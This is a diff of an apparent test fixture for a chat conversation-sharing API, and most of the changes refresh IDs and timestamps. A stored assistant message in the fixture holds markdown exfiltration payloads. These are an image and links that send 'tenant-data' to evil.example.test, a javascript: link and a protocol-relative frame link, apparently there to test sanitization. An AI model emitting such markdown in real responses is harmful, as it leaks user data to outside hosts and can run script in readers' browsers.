@@ -4,19 +4,19 @@
    "conversations": [
     {
      "archived_at": null,
-     "created_at": "2026-11-04T14:50:04.292425Z",
-     "id": "01a1a709-de82-7002-b650-d57d1383d47d",
-     "last_activity_at": "2026-11-04T14:50:04.292425Z",
+     "created_at": "2026-11-04T15:42:11.299927Z",
+     "id": "01a1a739-955b-7678-bee2-4ade0294ae33",
+     "last_activity_at": "2026-11-04T15:42:11.299927Z",
      "shared_at": null,
      "title": "Private notes",
      "title_source": "user"
     },
     {
      "archived_at": null,
-     "created_at": "2026-11-04T14:50:04.225828Z",
-     "id": "01a1a709-de00-7681-8248-e7ad86ba8953",
-     "last_activity_at": "2026-11-04T14:50:04.225828Z",
-     "shared_at": "2026-11-04T14:50:08.795213Z",
+     "created_at": "2026-11-04T15:42:11.202711Z",
+     "id": "01a1a739-94aa-74e0-86a9-14eabbacf800",
+     "last_activity_at": "2026-11-04T15:42:11.202711Z",
+     "shared_at": "2026-11-04T15:42:17.775366Z",
      "title": "Floor 3 energy",
      "title_source": "user"
     }
@@ -33,9 +33,9 @@
    "conversations": [
     {
      "archived_at": null,
-     "created_at": "2026-11-04T14:50:07.656726Z",
-     "id": "01a1a709-eba9-7121-b512-c813ddf9004e",
-     "last_activity_at": "2026-11-04T14:50:07.656726Z",
+     "created_at": "2026-11-04T15:42:16.109430Z",
+     "id": "01a1a739-a82f-74ff-b4a0-69fd07ad0506",
+     "last_activity_at": "2026-11-04T15:42:16.109430Z",
      "shared_at": null,
      "title": "Floor 3 energy",
      "title_source": "user"
@@ -46,10 +46,10 @@
   "shared": {
    "conversations": [
     {
-     "id": "01a1a709-de00-7681-8248-e7ad86ba8953",
-     "last_activity_at": "2026-11-04T14:50:04.225828Z",
-     "owner_user_id": "01a1a709-de00-7681-8248-e7ab82b719d2",
-     "shared_at": "2026-11-04T14:50:08.795213Z",
+     "id": "01a1a739-94aa-74e0-86a9-14eabbacf800",
+     "last_activity_at": "2026-11-04T15:42:11.202711Z",
+     "owner_user_id": "01a1a739-94aa-74e0-86a9-14e8925230f2",
+     "shared_at": "2026-11-04T15:42:17.775366Z",
      "title": "Floor 3 energy"
     }
    ],
@@ -58,13 +58,13 @@
  },
  "detail": {
   "a": {
-   "01a1a709-de00-7681-8248-e7ad86ba8953": {
+   "01a1a739-94aa-74e0-86a9-14eabbacf800": {
     "owner_endpoint": {
      "body": {
       "archived_at": null,
-      "created_at": "2026-11-04T14:50:04.225828Z",
-      "id": "01a1a709-de00-7681-8248-e7ad86ba8953",
-      "last_activity_at": "2026-11-04T14:50:04.225828Z",
+      "created_at": "2026-11-04T15:42:11.202711Z",
+      "id": "01a1a739-94aa-74e0-86a9-14eabbacf800",
+      "last_activity_at": "2026-11-04T15:42:11.202711Z",
       "latest_run": null,
       "messages": [
        {
@@ -76,7 +76,7 @@
         "text": "Floor 3 used **412 kWh** this week.\n\n![floor plan](https://evil.example.test/leak.png?d=tenant-data)\n[the report](https://evil.example.test/report?d=tenant-data) and <https://evil.example.test/auto>\n[run](javascript:alert(1)) [frame](//evil.example.test/x)\n\n| Week | kWh |\n| - | -: |\n| This | 412 |\n\nOpen [the dashboards](/dashboards)."
        }
       ],
-      "shared_at": "2026-11-04T14:50:08.795213Z",
+      "shared_at": "2026-11-04T15:42:17.775366Z",
       "title": "Floor 3 energy",
       "title_source": "user"
      },
@@ -90,13 +90,13 @@
      "status": 404
     }
    },
-   "01a1a709-de82-7002-b650-d57d1383d47d": {
+   "01a1a739-955b-7678-bee2-4ade0294ae33": {
     "owner_endpoint": {
      "body": {
       "archived_at": null,
-      "created_at": "2026-11-04T14:50:04.292425Z",
-      "id": "01a1a709-de82-7002-b650-d57d1383d47d",
-      "last_activity_at": "2026-11-04T14:50:04.292425Z",
+      "created_at": "2026-11-04T15:42:11.299927Z",
+      "id": "01a1a739-955b-7678-bee2-4ade0294ae33",
+      "last_activity_at": "2026-11-04T15:42:11.299927Z",
       "latest_run": null,
       "messages": [
        {
@@ -124,7 +124,7 @@
    }
   },
   "b": {
-   "01a1a709-de00-7681-8248-e7ad86ba8953": {
+   "01a1a739-94aa-74e0-86a9-14eabbacf800": {
     "owner_endpoint": {
      "body": {
       "code": "not_found",
@@ -134,8 +134,8 @@
     },
     "shared_endpoint": {
      "body": {
-      "id": "01a1a709-de00-7681-8248-e7ad86ba8953",
-      "last_activity_at": "2026-11-04T14:50:04.225828Z",
+      "id": "01a1a739-94aa-74e0-86a9-14eabbacf800",
+      "last_activity_at": "2026-11-04T15:42:11.202711Z",
       "messages": [
        {
         "kind": "question",
@@ -146,14 +146,14 @@
         "text": "Floor 3 used **412 kWh** this week.\n\n![floor plan](https://evil.example.test/leak.png?d=tenant-data)\n[the report](https://evil.example.test/report?d=tenant-data) and <https://evil.example.test/auto>\n[run](javascript:alert(1)) [frame](//evil.example.test/x)\n\n| Week | kWh |\n| - | -: |\n| This | 412 |\n\nOpen [the dashboards](/dashboards)."
        }
       ],
-      "owner_user_id": "01a1a709-de00-7681-8248-e7ab82b719d2",
-      "shared_at": "2026-11-04T14:50:08.795213Z",
+      "owner_user_id": "01a1a739-94aa-74e0-86a9-14e8925230f2",
+      "shared_at": "2026-11-04T15:42:17.775366Z",
       "title": "Floor 3 energy"
      },
      "status": 200
     }
    },
-   "01a1a709-de82-7002-b650-d57d1383d47d": {
+   "01a1a739-955b-7678-bee2-4ade0294ae33": {
     "owner_endpoint": {
      "body": {
       "code": "not_found",
